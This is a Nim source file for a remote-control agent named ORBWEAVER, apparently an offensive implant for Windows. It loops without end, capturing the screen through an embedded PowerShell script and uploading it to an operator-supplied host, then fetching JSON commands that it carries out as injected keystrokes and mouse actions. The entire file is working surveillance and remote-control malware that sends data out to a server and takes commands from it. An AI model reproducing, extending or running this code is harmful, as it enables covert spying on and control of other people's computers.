import winim
import winim/clr
import sugar
import strutils
import std/httpclient
import std/json
import std/envvars
import os

type
  SendKeys = array[2, INPUT]

proc move_mouse(x: int32, y: int32) =
    var inputs: SendKeys
    inputs[0].type = INPUT_MOUSE
    inputs[0].mi.dx=x;
    inputs[0].mi.dy=y;
    inputs[0].mi.dwFlags=(MOUSEEVENTF_ABSOLUTE or MOUSEEVENTF_MOVE);
    inputs[0].mi.mouseData=0;
    inputs[0].mi.dwExtraInfo=0;
    inputs[0].mi.time=0;

    SendInput(1, &inputs[0], (int32)sizeof(INPUT));

proc take_and_save_screenshot(screenshotPath: string) =
    echo "[+] Getting screen specs"
    var hDc = GetDC(0)
    var nScreenWidth = GetDeviceCaps(hDc, HORZRES)
    echo "\t|-> nScreenWidth: ", nScreenWidth
    var nScreenHeight = GetDeviceCaps(hDc, VERTRES)
    echo "\t|-> nScreenHeight: ", nScreenHeight

    echo "[+] Initializing PowerShell"
    var Automation = load("System.Management.Automation")
    dump Automation
    var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
    dump RunspaceFactory

    var runspace = @RunspaceFactory.CreateRunspace()
    dump runspace

    runspace.Open()

    var pipeline = runspace.CreatePipeline()
    dump pipeline

    var screenshotCmd = """
    [Reflection.Assembly]::LoadWithPartialName("System.Drawing");
    function screenshot([Drawing.Rectangle]$bounds, $path) {
    $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;
    $graphics = [Drawing.Graphics]::FromImage($bmp);
    
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
    
    $bmp.Save($path);
    
    $graphics.Dispose();
    $bmp.Dispose();
    }

    $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, @right, @bottom);
    screenshot $bounds "@screenshotPath";
    """
    screenshotCmd = screenshotCmd.replace("@right", $(nScreenWidth))
    screenshotCmd = screenshotCmd.replace("@bottom", $(nScreenHeight))
    screenshotCmd = screenshotCmd.replace("@screenshotPath", screenshotPath)
    pipeline.Commands.AddScript(screenshotCmd)
    echo "[+] Executing PowerShell"
    var results = pipeline.Invoke()
    echo "\t|-> Result saved as: ", screenshotPath
    runspace.Close()


proc post_screenshot(url: string, screenshotPath: string) =
    var client = newHttpClient()
    var data = newMultipartData()
    data.addFiles({"file": screenshotPath})
    try:
        discard client.postContent(url, multipart=data)
    finally:
        client.close()


proc sendSingleChar(key: int) =
  # https://batchloaf.wordpress.com/2012/04/17/simulating-a-keystroke-in-win32-c-or-c-using-sendinput/

  # verify special char
  var input: SendKeys

  input[0].type = INPUT_KEYBOARD
  input[0].ki.wScan = 0
  input[0].ki.time = 0
  input[0].ki.dwExtraInfo = 0

  input[0].ki.wVk = (uint16)key 
  input[0].ki.dwFlags = 0

  SendInput(1, &input[0], (int32)sizeof(INPUT));

  input[1].ki.dwFlags = KEYEVENTF_KEYUP
  SendInput(1, &input[1], (int32)sizeof(INPUT))


proc toASCIIint(key: string): int =
  return int(char(key[0]))

proc sendSingleCharUppercase(key:int) = 
    var inputs: SendKeys
    inputs[0].type = INPUT_KEYBOARD
    inputs[0].ki.dwFlags = KEYEVENTF_EXTENDEDKEY
    inputs[0].ki.wVk = VK_RSHIFT
    # send key
    SendInput((UINT)len(inputs), &inputs[0], (int32)sizeof(INPUT))

    var input: SendKeys

    input[0].type = INPUT_KEYBOARD
    input[0].ki.wScan = 0
    input[0].ki.time = 0
    input[0].ki.dwExtraInfo = 0

    input[0].ki.wVk = (uint16)key 
    input[0].ki.dwFlags = 0

    SendInput(1, &input[0], (int32)sizeof(INPUT));

    input[1].ki.dwFlags = KEYEVENTF_KEYUP
    SendInput(1, &input[1], (int32)sizeof(INPUT))

    var inputs1: SendKeys
    inputs1[0].type       = INPUT_KEYBOARD;
    inputs1[0].ki.dwFlags = KEYEVENTF_KEYUP or KEYEVENTF_EXTENDEDKEY
    inputs1[0].ki.wVk   = VK_RSHIFT;
    SendInput((UINT)len(inputs1), &inputs1[0], (int32)sizeof(INPUT))

proc sendString(key: string) =

  for c in key:
    var i = int(c)
    # verify if uppercase
    Sleep(150)  
    if i == 0x20:
      sendSingleChar(VK_SPACE)
    elif c == '.':
      sendSingleChar(VK_OEM_PERIOD)
    elif c == '=': 
      var inputs: SendKeys
      inputs[0].type = INPUT_KEYBOARD
      inputs[0].ki.dwFlags = KEYEVENTF_EXTENDEDKEY
      inputs[0].ki.wVk = VK_RSHIFT
      SendInput((UINT)len(inputs), &inputs[0], (int32)sizeof(INPUT))
      # send key
      sendSingleChar(0x30)

      inputs[0].type       = INPUT_KEYBOARD;
      inputs[0].ki.dwFlags = KEYEVENTF_KEYUP or KEYEVENTF_EXTENDEDKEY
      inputs[0].ki.wVk   = VK_RSHIFT;
      SendInput((UINT)len(inputs), &inputs[0], (int32)sizeof(INPUT))    
    elif c == '-': 
      sendSingleChar(VK_OEM_MINUS)
    elif i > 0x29 and i < 0x3A:
      sendSingleChar(i)
    # uppercase
    elif i > 0x40 and i < 0x5B:
      sendSingleCharUppercase(i)
    else:
      i = i - 0x20
      sendSingleChar(i)

proc left_click() =
  var inputs: SendKeys
  inputs[0].type = INPUT_MOUSE
  inputs[0].mi.dwFlags=(MOUSEEVENTF_LEFTDOWN or MOUSEEVENTF_LEFTUP);
  inputs[0].mi.mouseData=0;
  inputs[0].mi.dwExtraInfo=0;
  inputs[0].mi.time=0;

  SendInput(1, &inputs[0], (int32)sizeof(INPUT));

proc right_click() =
  var inputs: SendKeys
  inputs[0].type = INPUT_MOUSE
  inputs[0].mi.dwFlags=(MOUSEEVENTF_RIGHTDOWN or MOUSEEVENTF_RIGHTUP);
  inputs[0].mi.mouseData=0;
  inputs[0].mi.dwExtraInfo=0;
  inputs[0].mi.time=0;

  SendInput(1, &inputs[0], (int32)sizeof(INPUT));


# Parse execution mode args
var 
    helpVariations = @["help", "-h", "--help", "/h", "/help"]
    help = """
ORBWEAVER agent v0.1 - by Mark Steenberg (0x0vid)

usage: agent.exe [ip]:[port]

example: agent.exe 127.0.0.1:5000
"""
# Parse commandline args
# agent.exe 127.0.0.1:5000
if paramCount() == 0:
    echo help
    quit()

if paramStr(1) in helpVariations:
    echo help
    quit()

var url = "http://" & paramStr(1) & "/screenshot"
if ":" in paramStr(1):
    echo "[+] Screenshot URL: ", url
else: 
    echo help
    quit()

var screenshotPath = "$env:LOCALAPPDATA\\screenshot.png"
var screenshotPathNim = getEnv("LOCALAPPDATA") & "\\screenshot.png"
echo "[+] Using %LOCALAPPDATA% to store screenshots"

while true:
    var client = newHttpClient()
    take_and_save_screenshot(screenshotPath)
    echo "[+] Posting screenshot"
    try:
      post_screenshot(url, screenshotPathNim)
      echo "[+] Executing command"
      try:
          # parse parameters
          let jsonCmd = parseJson(client.getContent("http://" & paramStr(1) & "/cmd"))
          if jsonCmd["keystrokes"].getStr() == "kill":
              echo "[!] Killing agent"
              quit()
          # send keystrokes
          if jsonCmd["keystrokes"].getStr() != "":
              var keystrokes = jsonCmd["keystrokes"].getStr()
              echo "\t|-> Sending keystrokes: ", keystrokes
              sendString(keystrokes)
              Sleep(500)  
              sendSingleChar(VK_RETURN)
          # mouse actions
          if jsonCmd["mouse"]["x"].getInt() != 0 and jsonCmd["mouse"]["y"].getInt() != 0:
              echo "\t|-> Moving mouse, x: ", cast[int32](jsonCmd["mouse"]["x"].getInt()), " | y: ", cast[int32](jsonCmd["mouse"]["y"].getInt())
              move_mouse(cast[int32](jsonCmd["mouse"]["x"].getInt()), cast[int32](jsonCmd["mouse"]["y"].getInt()))
          if jsonCmd["mouse"]["action"].getStr() != "":
              if jsonCmd["mouse"]["action"].getStr() == "double_click":
                  left_click()
                  left_click()
              if jsonCmd["mouse"]["action"].getStr() == "left_click":
                  left_click()
              if jsonCmd["mouse"]["action"].getStr() == "right_click":
                  right_click()
      finally:
          client.close()
    except:
      echo "[ERROR] Error when POSTing screenshot"
    
    sleep(5000)